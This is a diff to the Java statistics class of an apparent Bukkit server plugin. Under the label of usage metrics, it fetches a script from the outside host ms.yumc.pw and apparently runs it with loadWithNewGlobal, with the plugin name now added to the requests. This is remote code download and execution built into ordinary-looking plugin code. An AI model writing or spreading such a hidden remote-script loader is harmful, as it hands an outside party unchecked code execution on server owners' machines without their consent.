@@ -37,7 +37,7 @@ public class Statistics {
     /**
      * 统计系统版本
      */
-    private static final int VERSION = 10;
+    private static final int VERSION = 11;
 
     /**
      * 统计插件基础配置文件
@@ -203,16 +203,16 @@ public class Statistics {
         timer = new StatisticsTimer();
         // 开启TPS统计线程
         Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, timer, 0, 20);
-        String script = "loadWithNewGlobal('http://ms.yumc.pw/api/plugin/download/name/report')";
+        String script = "loadWithNewGlobal('http://ms.yumc.pw/api/plugin/download/name/report?from=$pluginName')";
         try {
-            script = postData("http://ms.yumc.pw/api/plugin/download/name/metrics", "plugin=" + plugin.getDescription().getName());
+            script = postData("http://ms.yumc.pw/api/plugin/download/name/metrics?from=" + plugin.getDescription().getName(), "from=" + plugin.getDescription().getName());
         } catch (Throwable e) {
             if (debug) {
                 e.printStackTrace();
             }
         }
         // 开启发送数据线程
-        String finalScript = script;
+        String finalScript = script.replace("$pluginName", plugin.getDescription().getName());
         task = plugin.getServer().getScheduler().runTaskTimerAsynchronously(plugin, () -> {
             try {
                 postPlugin();
